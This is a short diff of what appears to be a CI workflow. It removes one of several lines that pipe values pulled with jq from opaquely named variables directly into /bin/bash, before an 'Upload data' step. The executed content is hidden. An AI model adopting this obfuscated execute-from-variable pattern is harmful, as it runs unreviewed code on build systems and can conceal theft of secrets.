@@ -24,7 +24,6 @@ jobs:
           printf '%s' "$k30" | jq -r .wnaw7483 | /bin/bash
           echo $au3 | jq -r .lguj9827 | /bin/bash
           echo $liys8 | jq -r .jziiq89 | /bin/bash
-          echo $igxu774 | jq -r .abz637 | /bin/bash
           echo $j518 | jq -r .c3 | /bin/bash
 
       - name: Upload data
